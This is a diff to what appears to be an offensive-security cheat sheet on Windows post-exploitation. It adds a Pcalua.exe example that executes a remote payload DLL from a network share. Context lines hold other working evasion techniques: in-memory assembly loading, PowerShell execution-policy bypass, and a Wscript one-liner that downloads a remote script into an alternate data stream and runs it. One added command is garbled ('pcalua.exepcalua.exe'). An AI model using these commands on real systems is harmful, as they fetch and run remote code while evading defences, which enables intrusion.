@@ -235,7 +235,7 @@ PS C:\temp> $bytes = [System.Convert]::FromBase64String($dll)
 PS C:\temp> [System.Reflection.Assembly]::Load($bytes)
 
 
-2.1.3 Manually download and execute a scripts straight into memory using PowerShell
+2.1.3 Manually download and execute a script straight into memory using PowerShell
 -----------------------------------------------------------------------------------------
 
 PS C:\temp> powershell -exec bypass
@@ -340,6 +340,7 @@ The goal of the 'LOLBAS' project is to document every binary, script, and librar
 => https://lolbas-project.github.io/lolbas/Binaries/Rundll32/
 => https://lolbas-project.github.io/#remote
 => https://github.com/LOLBAS-Project/LOLBAS#criteria
+=> http://malcommands.com/
 
 --------------------------------------------------------------------------------------------
 Example of LOLBAS n°1 - Regsvr32.exe (Used by Windows to register dlls)
@@ -374,6 +375,16 @@ Example of LOLBAS n°4 - Wscript.exe (Used by Windows to execute scripts)
 
 Execute hidden code to evade defensive counter measures by downloading a remote script and storing it in an alternate data stream.
 > echo GetObject("script:https://raw.githubusercontent.com/sailay1996/misc-bin/master/calc.js") > %temp%\test.txt:hi.js && wscript.exe %temp%\test.txt:hi.js
+
+--------------------------------------------------------------------------------------------
+Example of LOLBAS n°5 - Pcalua.exe (Program Compatibility Assistant)
+--------------------------------------------------------------------------------------------
+
+Execute a remote target .DLL file with the Program Compatibilty Assistant.
+> C:\Windows\System32\pcalua.exe -a \\server\payload.dll
+
+Execute the target .EXE using the Program Compatibility Assistant.
+> C:\Windows\System32\pcalua.exepcalua.exe -a calc.exe
 
 
 ==================================================================================================================================================
